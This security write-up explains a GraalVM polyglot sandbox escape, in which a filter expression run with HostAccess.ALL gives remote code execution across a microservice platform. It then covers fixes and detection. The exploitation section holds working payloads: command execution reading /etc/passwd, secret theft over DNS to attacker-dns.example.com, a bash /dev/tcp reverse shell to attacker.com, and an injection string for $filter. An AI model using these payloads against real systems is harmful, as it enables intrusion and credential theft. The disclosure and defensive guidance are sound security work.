---
layout: default
title: "RCE via GraalVM Polyglot Sandbox Escape"
category: writeups
difficulty: advanced
tags: [rce, graalvm, java, sandbox-escape, polyglot]
---

# From Filter Parameter to Remote Code Execution: GraalVM Polyglot Sandbox Escape

> A shared Java library used by every microservice in a cloud-native platform evaluated filter expressions using GraalVM's polyglot engine with `HostAccess.ALL` — granting JavaScript code full access to the Java runtime. A single injectable filter parameter meant Remote Code Execution across the entire service mesh.

---

## TL;DR

- **Vulnerability Class:** CWE-94 (Code Injection) / CWE-250 (Execution with Unnecessary Privileges)
- **Severity:** Critical (CVSS 10.0)
- **Root Cause:** GraalVM JavaScript context created with `HostAccess.ALL` and unrestricted class lookup; user-influenced expression evaluated via `ctx.eval("js", expr)`
- **Impact:** Arbitrary Java method invocation → Remote Code Execution → Full platform compromise
- **Blast Radius:** Shared library inherited by every microservice — single exploit compromises the entire platform

---

## Background: GraalVM Polyglot

[GraalVM](https://www.graalvm.org/) is a high-performance runtime that supports polyglot programming — executing code in multiple languages (Java, JavaScript, Python, Ruby, R) within the same application. Its `Context` API allows Java applications to evaluate dynamic expressions in guest languages.

The security model relies on **host access policies** that control what the guest language can reach:

| Policy | Effect |
|---|---|
| `HostAccess.NONE` | Guest code is completely sandboxed — no Java access |
| `HostAccess.EXPLICIT` | Only `@HostAccess.Export`-annotated methods accessible |
| `HostAccess.SCOPED` | Time-limited access to specific members |
| **`HostAccess.ALL`** | **Full unrestricted access to all Java classes and methods** |

`HostAccess.ALL` is explicitly documented as unsafe for untrusted code. It exists for development/testing scenarios where convenience outweighs security.

---

## The Vulnerability

### The Vulnerable Code

In the platform's shared service handler library — imported by every microservice — filter expressions were evaluated dynamically:

```java
private Predicate<Map<String, Object>> createFilterChecker(String expr) {
    return filters -> {
        try (var ctx = org.graalvm.polyglot.Context.newBuilder("js")
                .allowHostAccess(org.graalvm.polyglot.HostAccess.ALL)
                .allowHostClassLookup(s -> true)
                .option("engine.WarnInterpreterOnly", "false")
                .build()) {
            ctx.getBindings("js").putMember("filters", filters);
            return ctx.eval("js", expr).asBoolean();
        }
    };
}
```

Three configuration choices make this catastrophic:

| Configuration | Effect |
|---|---|
| `allowHostAccess(HostAccess.ALL)` | JavaScript can access any Java object's methods and fields |
| `allowHostClassLookup(s -> true)` | JavaScript can load **any** Java class by name via `Java.type()` |
| `ctx.eval("js", expr)` | The expression string is evaluated as JavaScript code |

### Why It's Exploitable

The `expr` parameter originates from OData `$filter` query parameters. The platform converts OData filter syntax into JavaScript expressions for server-side evaluation. If the conversion is insufficient or bypassable, an attacker can inject arbitrary JavaScript that will be evaluated with full Java access.

Even with OData-to-JS conversion in place, the attack surface is the **shared library itself** — any future code path that calls `createFilterChecker()` with partially controlled input becomes an RCE vector.

---

## Exploitation

### Basic: Java Runtime Access

With `HostAccess.ALL` and unrestricted class lookup, JavaScript can directly invoke Java system commands:

```javascript
// Access java.lang.Runtime
var Runtime = Java.type('java.lang.Runtime');
var runtime = Runtime.getRuntime();

// Execute system command
var process = runtime.exec(['sh', '-c', 'id && whoami && cat /etc/passwd']);

// Read output
var BufferedReader = Java.type('java.io.BufferedReader');
var InputStreamReader = Java.type('java.io.InputStreamReader');
var reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
var output = '';
var line;
while ((line = reader.readLine()) != null) {
    output += line + '\n';
}
output;
```

### Stealth: Environment Variable Exfiltration

Cloud applications store secrets in environment variables. Exfiltrate without spawning a process:

```javascript
// Access environment variables (contains service credentials)
var System = Java.type('java.lang.System');
var env = System.getenv();

// Extract specific secrets
var dbPassword = env.get('DATABASE_PASSWORD');
var apiKey = env.get('API_KEY');
var xsuaaCredentials = env.get('VCAP_SERVICES');

// Exfiltrate via DNS (evades most egress filters)
var InetAddress = Java.type('java.net.InetAddress');
var encoded = Java.type('java.util.Base64').getEncoder()
    .encodeToString(dbPassword.getBytes());
InetAddress.getByName(encoded + '.attacker-dns.example.com');
```

### Advanced: Reverse Shell

For persistent access:

```javascript
var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
var pb = new ProcessBuilder(
    ['sh', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1']
);
pb.redirectErrorStream(true);
pb.start();
```

### Filesystem Access

Read application source, configuration, and secrets:

```javascript
var Files = Java.type('java.nio.file.Files');
var Path = Java.type('java.nio.file.Path');
var Paths = Java.type('java.nio.file.Paths');

// Read application configuration
var config = Files.readString(Path.of('/app/application.yaml'));

// Read service bindings (credentials)
var bindings = Files.readString(Path.of('/etc/secrets/service-binding/credentials.json'));

// List all files in secrets directory
var stream = Files.walk(Paths.get('/etc/secrets/'));
stream.forEach(function(path) {
    // process each file
});
```

### Network Pivot

Access internal services from within the cluster:

```javascript
var URL = Java.type('java.net.URL');
var Scanner = Java.type('java.util.Scanner');

// Access internal service (bypass network segmentation)
var url = new URL('http://internal-database-service:5432/');
var conn = url.openConnection();
var scanner = new Scanner(conn.getInputStream()).useDelimiter('\\A');
var response = scanner.hasNext() ? scanner.next() : '';
```

---

## Blast Radius

This code was in a **shared library** — the platform equivalent of a supply chain compromise:

```
Shared Library (BaseServiceHandler)
    │
    ├── dox-document-service      → RCE on document processor
    ├── dox-workflow               → RCE on workflow engine
    ├── dox-configuration          → RCE on config service (access to all tenant configs)
    ├── dox-scheduler              → RCE on job scheduler (can trigger any job)
    ├── channel                    → RCE on integration service (access to webhooks/emails)
    ├── dox-metering               → RCE on billing service
    └── [every other service]      → Complete platform compromise
```

A single exploitation gives the attacker:
- **All service credentials** (via environment variables / VCAP_SERVICES)
- **Database access** (connection strings in env)
- **Inter-service impersonation** (can call any internal API)
- **Tenant data access** (multi-tenant database, all tenants)
- **Persistent access** (modify deployment, inject backdoors)

---

## Attack Chain: End-to-End

```
Step 1: Identify filter parameter
         GET /api/v1/Service/Entity?$filter=<injection_point>

Step 2: Inject JavaScript via malformed filter expression
         $filter=true;var R=Java.type('java.lang.Runtime');R.getRuntime().exec('...');//

Step 3: GraalVM evaluates expression with HostAccess.ALL
         → Full Java runtime access from JavaScript

Step 4: Execute payload
         → Exfiltrate VCAP_SERVICES (all bound service credentials)
         → Read database connection strings
         → Access internal APIs with stolen credentials

Step 5: Lateral movement
         → Use stolen credentials to access other services
         → Shared library means any service is a valid entry point
         → Compromise entire platform
```

---

## The Fix

### Option 1: Remove GraalVM Entirely (Recommended)

Replace dynamic JavaScript evaluation with a safe expression language:

```java
// ✅ FIXED: Use Spring Expression Language (SpEL) with restrictions
private Predicate<Map<String, Object>> createFilterChecker(String expr) {
    SpelExpressionParser parser = new SpelExpressionParser(
        new SpelParserConfiguration(SpelCompilerMode.OFF, null));

    // Restrictive evaluation context — no method invocation
    SimpleEvaluationContext context = SimpleEvaluationContext
        .forReadOnlyDataBinding()
        .withInstanceMethods()  // Only getter methods
        .build();

    return filters -> {
        context.setRootObject(filters);
        return Boolean.TRUE.equals(
            parser.parseExpression(expr).getValue(context, Boolean.class));
    };
}
```

### Option 2: Sandbox GraalVM Properly

If polyglot evaluation is genuinely required:

```java
// ✅ FIXED: Locked-down GraalVM context
private Predicate<Map<String, Object>> createFilterChecker(String expr) {
    // Validate expression against allowlist BEFORE evaluation
    if (!SAFE_EXPRESSION_PATTERN.matcher(expr).matches()) {
        throw new SecurityException("Invalid filter expression");
    }

    return filters -> {
        try (var ctx = Context.newBuilder("js")
                .allowHostAccess(HostAccess.NONE)               // No Java access
                .allowHostClassLookup(s -> false)               // No class loading
                .allowIO(IOAccess.NONE)                         // No filesystem
                .allowCreateProcess(false)                      // No exec
                .allowCreateThread(false)                       // No threads
                .allowNativeAccess(false)                       // No native calls
                .allowEnvironmentAccess(EnvironmentAccess.NONE) // No env vars
                .option("js.ecmascript-version", "2020")
                .build()) {

            // Only expose filter data as a frozen JS object
            Value bindings = ctx.getBindings("js");
            bindings.putMember("f", ProxyObject.fromMap(
                Collections.unmodifiableMap(filters)));

            return ctx.eval("js", expr).asBoolean();
        }
    };
}
```

### Option 3: Input Validation (Defense in Depth)

Regardless of runtime configuration, validate filter expressions:

```java
// Allowlist of safe filter operations
private static final Pattern SAFE_FILTER = Pattern.compile(
    "^[a-zA-Z0-9_.\\s]+\\s*(==|!=|>|<|>=|<=|&&|\\|\\|)\\s*" +
    "('[^']*'|\"[^\"]*\"|[0-9.]+|true|false|null)$"
);

private void validateExpression(String expr) {
    if (!SAFE_FILTER.matcher(expr).matches()) {
        throw new IllegalArgumentException(
            "Filter expression contains disallowed characters");
    }

    // Block dangerous patterns even if regex somehow passes
    List<String> blocklist = List.of(
        "Java.type", "Runtime", "Process", "exec",
        "getClass", "forName", "getMethod", "invoke",
        "File", "Socket", "URL", "Thread"
    );

    for (String blocked : blocklist) {
        if (expr.contains(blocked)) {
            throw new SecurityException("Blocked expression: " + blocked);
        }
    }
}
```

---

## Comparison: Secure vs. Insecure GraalVM Configuration

```java
// ❌ INSECURE — equivalent to eval() with root
Context.newBuilder("js")
    .allowHostAccess(HostAccess.ALL)          // Everything accessible
    .allowHostClassLookup(s -> true)          // Any class loadable
    .build();

// ✅ SECURE — true sandbox
Context.newBuilder("js")
    .allowHostAccess(HostAccess.NONE)         // Nothing accessible
    .allowHostClassLookup(s -> false)         // No class loading
    .allowIO(IOAccess.NONE)                   // No filesystem
    .allowCreateProcess(false)                // No process spawning
    .allowCreateThread(false)                 // No threading
    .allowNativeAccess(false)                 // No JNI/native
    .allowEnvironmentAccess(EnvironmentAccess.NONE)  // No env vars
    .allowExperimentalOptions(false)          // No experimental features
    .build();
```

The difference between these two configurations is the difference between **arbitrary code execution** and a **safe expression evaluator**.

---

## Key Takeaways

1. **`HostAccess.ALL` is never appropriate for expressions derived from user input.** It exists for trusted internal scripting scenarios (plugin systems with code review, internal automation). If there's any path from external input to `ctx.eval()`, the context must be locked down.

2. **Shared libraries are force multipliers for vulnerabilities.** This single flaw propagated to every microservice in the platform. Security review of shared dependencies deserves disproportionate investment — a bug here is a bug everywhere.

3. **"Dynamic filter evaluation" is a code smell.** Whenever you see a system converting query parameters into executable expressions, ask: "What happens if the conversion is bypassed or incomplete?" The safest approach is to never evaluate user-derived expressions — use parameterized queries or pre-defined filter functions instead.

4. **GraalVM's security model is opt-in, not opt-out.** The default `Context.create()` without explicit restrictions may allow more access than expected. Always explicitly configure security boundaries. Treat `HostAccess.ALL` like `chmod 777` — a red flag in any code review.

5. **The blast radius determines severity, not just exploitability.** A code injection vulnerability in a single microservice is Critical. The same vulnerability in a shared library used by every service in the platform is an existential risk.

---

## Detection

### SAST Rules

Search for these patterns in your codebase:

```
# GraalVM with unsafe configuration
HostAccess.ALL
allowHostClassLookup(s -> true)
allowHostClassLookup(className -> true)

# Dynamic evaluation with any polyglot engine
ctx.eval("js",
ctx.eval("python",
ctx.eval("ruby",

# Combined: eval + ALL (critical finding)
Context.newBuilder.*allowHostAccess.*ALL.*eval
```

### Runtime Detection

Monitor for:
- Unexpected child processes spawned by Java services
- Outbound DNS queries to unusual domains
- Java services reading `/etc/passwd`, `/proc/self/environ`
- Environment variable access patterns outside normal startup

---

## References

- [GraalVM Security Guide](https://www.graalvm.org/latest/security-guide/)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP: Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [HostAccess.ALL Documentation](https://www.graalvm.org/sdk/javadoc/org/graalvm/polyglot/HostAccess.html#ALL)

---

*Discovered during an authorized white-box security assessment. Reported through responsible disclosure. The shared library has been patched to use a restrictive evaluation context across all consuming services.*
